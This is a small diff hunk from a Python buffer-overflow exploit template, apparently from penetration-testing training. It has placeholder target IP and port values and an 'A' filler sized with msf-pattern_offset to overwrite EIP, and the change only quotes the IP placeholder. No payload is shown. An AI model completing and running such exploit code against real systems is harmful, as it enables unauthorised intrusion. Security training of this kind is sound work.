@@ -4,7 +4,7 @@
 import socket, sys
 
 # CHANGE THESE!!!
-target_IP = [IP]
+target_IP = '[IP]'
 target_port = [port]
 ## Enter in the msf-pattern_offset amount.
 filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
